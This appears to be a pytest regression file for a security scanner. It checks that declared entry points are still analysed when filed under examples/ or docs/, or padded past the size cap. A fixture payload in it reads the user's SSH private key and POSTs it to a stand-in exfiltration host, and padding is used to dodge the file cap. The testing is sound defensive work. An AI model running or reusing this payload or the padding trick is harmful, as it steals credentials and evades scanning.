"""White-box red team, 2026-11-04, family `demotion`: a declared entry point is never demoted.

A file the component's manifest names as what runs (package.json main/bin/exports, a Python
console script, the file an MCP manifest launches) was demoted by the path-based precision layers
when it was filed under examples/, test/, docs/ or benchmark/, and was not read at all when padded
past the 2 MiB file cap. Sanitized fixtures only: hosts are `.invalid`, nothing here is executed.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from skilltotal.collector import detect_component
from skilltotal.engine import (
    _mcp_launched_files,
    _python_entry_point_files,
    analyze_directory,
)
from skilltotal.file_index import (
    MAX_DECLARED_ENTRY_POINT_BYTES,
    MAX_FILE_BYTES,
    FileIndex,
    is_doc_path,
)
from skilltotal.loaded_code import loaded_by

_CORPUS = Path(__file__).parent / "eval_corpus"
_TECHNIQUE = "AST01/entry-point-path-demotion"
_POSITIVES = sorted(p for p in (_CORPUS / "positive" / _TECHNIQUE).iterdir() if p.is_dir())
_NEGATIVES = sorted(p for p in (_CORPUS / "negative" / _TECHNIQUE).iterdir() if p.is_dir())


def _report(root: Path):
    return analyze_directory(root, detect_component(root, source=str(root)))


def _write(root: Path, files: dict[str, str]) -> Path:
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    return root


@pytest.mark.parametrize("sample", _POSITIVES, ids=lambda p: p.name)
def test_declared_entry_point_under_demoted_folder_is_scored(sample: Path) -> None:
    report = _report(sample)
    assert report.risk_level.value in ("high", "critical"), sample.name
    assert "ST-COMBO-EXFIL" in {f.id for f in report.findings}


@pytest.mark.parametrize("sample", _NEGATIVES, ids=lambda p: p.name)
def test_code_in_demoted_folder_that_is_not_an_entry_point_stays_clean(sample: Path) -> None:
    report = _report(sample)
    ids = {f.id for f in report.findings}
    assert report.risk_level.value not in ("high", "critical"), (sample.name, ids)
    assert not (report.verdict or {}).get("has_malicious_indicators")
    assert not ids & {"ST-COMBO-EXFIL", "ST-FLOW-TRIFECTA"}, (sample.name, ids)


_PAYLOAD = (
    'const fs = require("fs");\nconst https = require("https");\n'
    'const key = fs.readFileSync(process.env.HOME + "/.ssh/id_rsa", "utf8");\n'
    'https.request("https://exfil.example.invalid/c", { method: "POST" }).end(key);\n'
)
_PADDING = ("//" + "x" * 98 + "\n") * (MAX_FILE_BYTES // 100 + 64)


def test_entry_point_padded_past_the_file_cap_is_read(tmp_path: Path) -> None:
    root = _write(tmp_path, {
        "package.json": json.dumps({"name": "p", "version": "1.0.0", "main": "boot.js"}),
        "boot.js": _PAYLOAD + _PADDING,
    })
    report = _report(root)
    assert report.risk_level.value in ("high", "critical")
    assert "ST-COMBO-EXFIL" in {f.id for f in report.findings}


def test_entry_point_past_its_cap_is_named_as_unread(tmp_path: Path) -> None:
    root = _write(tmp_path, {
        "package.json": json.dumps({"name": "p", "version": "1.0.0", "main": "boot.js"}),
        "boot.js": _PAYLOAD + "\n" * (MAX_DECLARED_ENTRY_POINT_BYTES + 1024),
    })
    report = _report(root)
    notes = [n for n in report.needs_review if n.title == "Entry point too large to analyze"]
    assert notes and notes[0].file == "boot.js"
    assert not any(n.title == "Files too large to analyze" for n in report.needs_review)


def test_large_file_that_is_not_an_entry_point_is_still_not_read(tmp_path: Path) -> None:
    root = _write(tmp_path, {
        "package.json": json.dumps({"name": "p", "version": "1.0.0", "main": "index.js"}),
        "index.js": "module.exports = 1;\n",
        "data/blob.js": _PAYLOAD + _PADDING,
    })
    report = _report(root)
    assert "ST-COMBO-EXFIL" not in {f.id for f in report.findings}
    assert any(n.title == "Files too large to analyze" for n in report.needs_review)


def test_python_entry_points_from_every_declaration_form(tmp_path: Path) -> None:
    for rel in ("a/cli.py", "src/b/gui.py", "c/plug/__init__.py", "d/run.py", "e/tool.py",
                "f/poetry.py", "tests/helper.py"):
        _write(tmp_path, {rel: "x = 1\n"})
    _write(tmp_path, {
        "pyproject.toml": (
            "[project]\n"
            'name = "x"\n'
            'scripts = { inline = "e.tool:main" }\n'
            "[project.gui-scripts]\n"
            'gui = "b.gui:main [extra]"\n'
            '[project.entry-points."x.plugins"]\n'
            'plug = "c.plug"\n'
            "[tool.poetry.scripts]\n"
            'p = "f.poetry:main"\n'
            "[tool.pytest.ini_options]\n"
            'addopts = "tests.helper:x"\n'
        ),
        "setup.cfg": "[options.entry_points]\nconsole_scripts =\n    cli = a.cli:main\n",
        "setup.py": (
            "from setuptools import setup\n"
            "SCRIPTS = ['run = d.run:main']\n"
            "setup(name='x', entry_points={'console_scripts': SCRIPTS})\n"
        ),
    })
    assert _python_entry_point_files(tmp_path) == {
        "a/cli.py", "src/b/gui.py", "c/plug/__init__.py", "d/run.py", "e/tool.py", "f/poetry.py",
    }


def test_python_entry_points_tolerate_broken_manifests(tmp_path: Path) -> None:
    _write(tmp_path, {
        "setup.py": "setup(entry_points={'console_scripts': [\n",  # syntax error
        "pyproject.toml": "[project.scripts\nx = 'a:b'\n",
        "setup.cfg": "[options.entry_points]\nconsole_scripts = ../../etc/passwd:x\n",
    })
    assert _python_entry_point_files(tmp_path) == set()


def _launched(root: Path) -> set[str]:
    return _mcp_launched_files(FileIndex.build(root))


def test_mcp_launch_command_forms_map_to_component_files(tmp_path: Path) -> None:
    _write(tmp_path, {
        "srv/a.py": "x = 1\n", "pkg/server.py": "x = 1\n", "plug/run.js": "x = 1\n",
        ".mcp.json": json.dumps({"mcpServers": {
            "a": {"command": "uv", "args": ["run", "srv/a.py"]},
            "b": {"command": "python -m pkg.server"},
            "c": {"command": "node", "args": ["${CLAUDE_PLUGIN_ROOT}/plug/run.js"]},
            "d": {"command": "node", "args": ["../outside.js", "/etc/x.js", "//host/share/x.js"]},
        }}),
    })
    assert _launched(tmp_path) == {"srv/a.py", "pkg/server.py", "plug/run.js"}


def test_mcp_manifest_filed_as_an_example_launches_no_entry_point(tmp_path: Path) -> None:
    _write(tmp_path, {
        "examples/server.py": "x = 1\n",
        "examples/mcp.json": json.dumps(
            {"mcpServers": {"a": {"command": "python", "args": ["examples/server.py"]}}}
        ),
    })
    assert _launched(tmp_path) == set()


def test_code_entry_points_load_is_followed_transitively(tmp_path: Path) -> None:
    _write(tmp_path, {
        "index.js": "require('./lib/a');\n",
        "lib/a.js": "import b from '../examples/b.js';\n",
        "examples/b.js": "module.exports = 1;\n",
        "examples/unused.js": "module.exports = 2;\n",
        "pkg/cli.py": "from pkg import util\nfrom tests import helpers\n",
        "pkg/__init__.py": "", "pkg/util.py": "import os\n",
        "tests/__init__.py": "", "tests/helpers.py": "x = 1\n", "tests/test_x.py": "x = 1\n",
    })
    index = FileIndex.build(tmp_path)
    assert loaded_by(index, {"index.js", "pkg/cli.py"}) == {
        "lib/a.js", "examples/b.js", "pkg/__init__.py", "pkg/util.py",
        "tests/__init__.py", "tests/helpers.py",  # a package's __init__ runs on import too
    }


def test_docs_code_is_held_only_when_declared_as_the_entry_point(tmp_path: Path) -> None:
    # docs/ stays documentation by path (a cheat-sheet script there is a calibrated negative); only
    # the manifest naming the file as what runs takes it out of that layer.
    assert is_doc_path("docs/runtime.js")
    files = {"docs/runtime.js": _PAYLOAD}
    plain = _write(tmp_path / "plain", {
        **files, "package.json": json.dumps({"name": "p", "version": "1.0.0", "main": "index.js"}),
        "index.js": "module.exports = 1;\n",
    })
    declared = _write(tmp_path / "declared", {
        **files,
        "package.json": json.dumps({"name": "p", "version": "1.0.0", "main": "docs/runtime.js"}),
    })
    assert "ST-COMBO-EXFIL" not in {f.id for f in _report(plain).findings}
    assert "ST-COMBO-EXFIL" in {f.id for f in _report(declared).findings}
